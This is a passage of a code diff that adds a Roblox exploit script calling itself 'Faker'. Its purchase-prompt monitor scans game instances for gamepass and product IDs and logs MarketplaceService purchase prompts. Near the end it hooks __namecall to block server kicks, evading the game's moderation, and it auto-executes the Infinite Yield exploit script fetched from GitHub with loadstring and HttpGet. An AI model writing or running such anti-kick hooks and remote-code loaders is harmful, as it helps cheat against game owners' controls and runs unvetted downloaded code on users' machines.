+    LogCorner.CornerRadius = UDim.new(0, 8)
+    LogCorner.Parent = LogFrame
+    
+    local LogStroke = Instance.new("UIStroke")
+    LogStroke.Color = Theme.Border
+    LogStroke.Thickness = 1
+    LogStroke.Parent = LogFrame
+    
+    local TextContainer = Instance.new("Frame")
+    TextContainer.Size = UDim2.new(0.6, 0, 1, 0)
+    TextContainer.Position = UDim2.new(0, 12, 0, 0)
+    TextContainer.BackgroundTransparency = 1
+    TextContainer.Parent = LogFrame
+    
+    local LogList = Instance.new("UIListLayout")
+    LogList.SortOrder = Enum.SortOrder.LayoutOrder
+    LogList.Padding = UDim.new(0, 4)
+    LogList.VerticalAlignment = Enum.VerticalAlignment.Center
+    LogList.Parent = TextContainer
+    
+    local TitleLabel = Instance.new("TextLabel")
+    TitleLabel.Size = UDim2.new(1, 0, 0, 18)
+    TitleLabel.BackgroundTransparency = 1
+    TitleLabel.Text = pName
+    TitleLabel.TextColor3 = Theme.Text
+    TitleLabel.TextSize = 13
+    TitleLabel.Font = Enum.Font.GothamBold
+    TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
+    TitleLabel.Parent = TextContainer
+    
+    local SubLabel = Instance.new("TextLabel")
+    SubLabel.Size = UDim2.new(1, 0, 0, 14)
+    SubLabel.BackgroundTransparency = 1
+    SubLabel.Text = "[" .. typeName .. "] ID: " .. tostring(purchasedId)
+    SubLabel.TextColor3 = Theme.Yellow
+    SubLabel.TextSize = 11
+    SubLabel.Font = Enum.Font.Code
+    SubLabel.TextXAlignment = Enum.TextXAlignment.Left
+    SubLabel.Parent = TextContainer
+    
+    local ButtonContainer = Instance.new("Frame")
+    ButtonContainer.Size = UDim2.new(0.35, 0, 1, 0)
+    ButtonContainer.Position = UDim2.new(0.65, -12, 0, 0)
+    ButtonContainer.BackgroundTransparency = 1
+    ButtonContainer.Parent = LogFrame
+    
+    local BtnList = Instance.new("UIListLayout")
+    BtnList.FillDirection = Enum.FillDirection.Horizontal
+    BtnList.HorizontalAlignment = Enum.HorizontalAlignment.Right
+    BtnList.VerticalAlignment = Enum.VerticalAlignment.Center
+    BtnList.SortOrder = Enum.SortOrder.LayoutOrder
+    BtnList.Padding = UDim.new(0, 8)
+    BtnList.Parent = ButtonContainer
+    
+    local LoadBtn = Instance.new("TextButton")
+    LoadBtn.Size = UDim2.new(0, 50, 0, 30)
+    LoadBtn.BackgroundColor3 = Color3.fromRGB(35, 35, 48)
+    LoadBtn.Text = "Load"
+    LoadBtn.TextColor3 = Theme.TextMuted
+    LoadBtn.TextSize = 11
+    LoadBtn.Font = Enum.Font.GothamBold
+    LoadBtn.LayoutOrder = 1
+    LoadBtn.Parent = ButtonContainer
+    
+    local LoadCorner = Instance.new("UICorner")
+    LoadCorner.CornerRadius = UDim.new(0, 6)
+    LoadCorner.Parent = LoadBtn
+    
+    local LoadStroke = Instance.new("UIStroke")
+    LoadStroke.Color = Color3.fromRGB(50, 50, 70)
+    LoadStroke.Parent = LoadBtn
+    
+    local CopyBtn = Instance.new("TextButton")
+    CopyBtn.Size = UDim2.new(0, 50, 0, 30)
+    CopyBtn.BackgroundColor3 = Theme.Accent
+    CopyBtn.Text = "Copy"
+    CopyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    CopyBtn.TextSize = 11
+    CopyBtn.Font = Enum.Font.GothamBold
+    CopyBtn.LayoutOrder = 2
+    CopyBtn.Parent = ButtonContainer
+    
+    local CopyCorner = Instance.new("UICorner")
+    CopyCorner.CornerRadius = UDim.new(0, 6)
+    CopyCorner.Parent = CopyBtn
+    
+    LoadBtn.MouseButton1Click:Connect(function()
+        ProductIDInput.Text = tostring(purchasedId)
+        selectTab("Action")
+        TS:Create(InputStroke, TweenInfo.new(0.15, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, 0, true), {Color = Color3.fromRGB(34, 197, 94)}):Play()
+    end)
+    
+    CopyBtn.MouseButton1Click:Connect(function()
+        copyToClipboard(tostring(purchasedId))
+        CopyBtn.Text = "Copied!"
+        task.wait(1)
+        CopyBtn.Text = "Copy"
+    end)
+    
+    addHoverEffect(LoadBtn, Color3.fromRGB(35, 35, 48), Color3.fromRGB(50, 50, 70))
+    addHoverEffect(CopyBtn, Theme.Accent, Theme.AccentHover)
+end
+
+local function createNoItemsLog()
+    local LogFrame = Instance.new("Frame")
+    LogFrame.Name = "NoItemsFound"
+    LogFrame.Size = UDim2.new(1, -6, 0, 45)
+    LogFrame.BackgroundColor3 = Theme.Card
+    LogFrame.BackgroundTransparency = 0.5
+    LogFrame.Parent = scannerTabFrame
+    
+    local LogCorner = Instance.new("UICorner")
+    LogCorner.CornerRadius = UDim.new(0, 8)
+    LogCorner.Parent = LogFrame
+    
+    local Msg = Instance.new("TextLabel")
+    Msg.Size = UDim2.new(1, 0, 1, 0)
+    Msg.BackgroundTransparency = 1
+    Msg.Text = "No Gamepass or Product elements detected in objects."
+    Msg.TextColor3 = Theme.TextMuted
+    Msg.TextSize = 12
+    Msg.Font = Enum.Font.GothamMedium
+    Msg.Parent = LogFrame
+end
+
+local function createInitialScanLog()
+    local LogFrame = Instance.new("Frame")
+    LogFrame.Name = "InitialScan"
+    LogFrame.Size = UDim2.new(1, -6, 0, 45)
+    LogFrame.BackgroundColor3 = Theme.Card
+    LogFrame.BackgroundTransparency = 0.5
+    LogFrame.Parent = scannerTabFrame
+    
+    local LogCorner = Instance.new("UICorner")
+    LogCorner.CornerRadius = UDim.new(0, 8)
+    LogCorner.Parent = LogFrame
+    
+    local Msg = Instance.new("TextLabel")
+    Msg.Size = UDim2.new(1, 0, 1, 0)
+    Msg.BackgroundTransparency = 1
+    Msg.Text = "Click the button above to safely search game instances for active IDs."
+    Msg.TextColor3 = Theme.TextMuted
+    Msg.TextSize = 12
+    Msg.Font = Enum.Font.GothamMedium
+    Msg.Parent = LogFrame
+end
+
+createInitialScanLog()
+
+local function scanGame()
+    for _, item in ipairs(scannerTabFrame:GetChildren()) do
+        if item:IsA("Frame") and item.Name ~= "ScanControlHeader" then
+            item:Destroy()
+        end
+    end
+    
+    local foundItems = {}
+    local function registerItem(name, id, itemType)
+        local idNum = tonumber(id)
+        if not idNum or idNum <= 0 then return end
+        local key = itemType .. "_" .. tostring(idNum)
+        if not foundItems[key] then
+            foundItems[key] = {Name = name, ID = idNum, Type = itemType}
+        end
+    end
+
+    local targets = {}
+    pcall(function() table.insert(targets, LocalPlayer:WaitForChild("PlayerGui", 2)) end)
+    pcall(function() table.insert(targets, game:GetService("Workspace")) end)
+    pcall(function() table.insert(targets, game:GetService("ReplicatedStorage")) end)
+
+    for _, target in ipairs(targets) do
+        if not target then continue end
+        pcall(function()
+            for _, desc in ipairs(target:GetDescendants()) do
+                pcall(function()
+                    local attrs = desc:GetAttributes()
+                    for attrName, attrVal in pairs(attrs) do
+                        if type(attrVal) == "number" then
+                            local lowerName = string.lower(attrName)
+                            if string.find(lowerName, "product") or string.find(lowerName, "devproduct") then
+                                registerItem(desc.Name, attrVal, "Product")
+                            elseif string.find(lowerName, "gamepass") or string.find(lowerName, "passid") or string.find(lowerName, "pass") then
+                                registerItem(desc.Name, attrVal, "Gamepass")
+                            end
+                        end
+                    end
+                end)
+
+                pcall(function()
+                    if desc:IsA("IntValue") or desc:IsA("NumberValue") then
+                        local lowerName = string.lower(desc.Name)
+                        if string.find(lowerName, "productid") or string.find(lowerName, "devproduct") then
+                            registerItem(desc.Parent.Name .. " [" .. desc.Name .. "]", desc.Value, "Product")
+                        elseif string.find(lowerName, "gamepass") or string.find(lowerName, "passid") then
+                            registerItem(desc.Parent.Name .. " [" .. desc.Name .. "]", desc.Value, "Gamepass")
+                        end
+                    end
+                end)
+                
+                pcall(function()
+                    if desc:IsA("GuiButton") then
+                        local idVal = desc:FindFirstChild("ID") or desc:FindFirstChild("Id")
+                        if idVal and (idVal:IsA("IntValue") or idVal:IsA("NumberValue")) then
+                            registerItem(desc.Name, idVal.Value, "Product/Gamepass")
+                        end
+                    end
+                end)
+            end
+        end)
+    end
+    
+    local count = 0
+    for _, item in pairs(foundItems) do
+        count = count + 1
+        createScannerLog(item.Name, item.ID, item.Type)
+    end
+    
+    if count == 0 then
+        createNoItemsLog()
+    end
+end
+
+ScanBtn.MouseButton1Click:Connect(scanGame)
+
+
+-- ==========================================
+-- PROMPT MONITORING INTERACTIVE EVENTS
+-- ==========================================
+
+MarketplaceService.PromptProductPurchaseRequested:Connect(function(player, productId, equipIfPurchased, currencyType)
+    if player == LocalPlayer then
+        addLog("Prompt Requested (Product)", productId, false, "Product")
+    end
+end)
+
+MarketplaceService.PromptGamePassPurchaseRequested:Connect(function(player, gamePassId)
+    if player == LocalPlayer then
+        addLog("Prompt Requested (Gamepass)", gamePassId, false, "Gamepass")
+    end
+end)
+
+MarketplaceService.PromptPurchaseRequested:Connect(function(player, assetId, equipIfPurchased, currencyType)
+    if player == LocalPlayer then
+        addLog("Prompt Requested (Asset)", assetId, false, "Asset")
+    end
+end)
+
+MarketplaceService.PromptProductPurchaseFinished:Connect(function(userId, productId, isPurchased)
+    if userId == LocalPlayer.UserId then
+        addLog("Product Prompt Completed", productId, isPurchased, "Product")
+    end
+end)
+
+MarketplaceService.PromptGamePassPurchaseFinished:Connect(function(player, gamePassId, wasPurchased)
+    if player == LocalPlayer then
+        addLog("Gamepass Prompt Completed", gamePassId, wasPurchased, "Gamepass")
+    end
+end)
+
+MarketplaceService.PromptPurchaseFinished:Connect(function(player, assetId, isPurchased)
+    if player == LocalPlayer then
+        addLog("Asset Prompt Completed", assetId, isPurchased, "Asset")
+    end
+end)
+
+
+-- ==========================================
+-- UTILITY BYPASSES & THIRD-PARTY INTEGRATION
+-- ==========================================
+
+-- Anti-Kick Protection Hook (Safe namecall structure to prevent core thread locks)
+task.spawn(function()
+    local hookSuccess, hook = pcall(function()
+        return hookmetamethod or (X_Hookmetamethod or nil)
+    end)
+    
+    if hookSuccess and hook then
+        local oldNamecall
+        oldNamecall = hook(game, "__namecall", function(self, ...)
+            local method = getnamecallmethod()
+            if self and typeof(self) == "Instance" and typeof(method) == "string" then
+                if self == LocalPlayer and (method == "Kick" or method == "kick") then
+                    warn("[Faker] Prevented server/local attempt to kick client.")
+                    return nil
+                end
+            end
+            return oldNamecall(self, ...)
+        end)
+    end
+end)
+
+-- Auto-Execute Infinite Yield
+task.spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+        print("[Faker] Infinite Yield auto-executed successfully.")
+    end)
+end)
